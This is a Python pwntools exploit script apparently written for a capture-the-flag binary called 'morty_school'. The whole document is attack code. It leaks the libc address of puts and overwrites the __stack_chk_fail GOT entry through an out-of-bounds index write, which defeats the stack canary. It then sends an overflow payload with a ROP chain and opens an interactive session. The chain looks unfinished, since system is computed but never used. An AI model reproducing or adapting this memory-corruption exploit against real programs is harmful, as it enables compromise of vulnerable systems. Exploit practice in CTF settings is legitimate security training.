#!/usr/bin/env python
from pwn import *
import pwnlib.elf
import pwnlib.shellcraft
import time


#c = remote('60.250.197.', )
# lib = ELF('./libc.so.6-cd7c1a035d24122798d97a47a10f6e2b71d58710aecfd392375f1aa9bdde164d')
e = ELF('./morty_school-d97056f03b991d718b35ef47fcfcaeb15f971b60b58d0eb0fcd8dcf3a3a11a99')

#debug
c = process('./morty_school-d97056f03b991d718b35ef47fcfcaeb15f971b60b58d0eb0fcd8dcf3a3a11a99')
lib = ELF('/usr/lib/libc.so.6')

context.terminal = ['alacritty', '-e', 'sh', '-c']
gdb.attach(c)

#init
context.os='linux'
context.arch='amd64'
context.log_level ='debug'

# get puts GOT address
c.recvuntil('Useful information: ')            # drop messege
lib_puts = int(c.recvuntil('\n'), 16)   # get address
print('\'' + str(lib_puts) + '\'')

# set return address is system()
lib_start = lib_puts - lib.symbols['puts']
lib_system = lib_start + lib.symbols['system']
lib_fail = lib_start + lib.symbols['__stack_chk_fail']

# replace __stack_chk_fail to ret
got_fail = e.got['__stack_chk_fail']
student_id_array = 0x6020a0

# if (*(long *)(&data_offset1 + the_which) != 0) {
#    size = read(0,*(void **)(student_id_array + the_which + 0x10),0x100);
setaddr = - student_id_array + got_fail - 0x10
setaddr = int(setaddr / 0x18) + 1
chekaddr = student_id_array + setaddr * 0x18 + 0x10
print(hex(chekaddr))

# rop

#print(hex(lib_system))
#print(hex(lib_fail))

ans = str(int(setaddr)).encode('utf_8')
c.sendline(ans)
sleep(1)

ans = b"A" * (0x18 - 4) + p64(0x0000000000400676)  # ret

c.recvuntil('correct') # sync
c.sendline(ans)

ans = b'a' * (115 - 8 * 4)
ans += p64(0x0000000000400d53) # pop rdi ; ret
ans += p64(0x400700)
ans += p64(0x400700) # puts
c.recvuntil('Confirm again') # sync
c.sendline(ans)
c.recv()

c.interactive()
c.close()

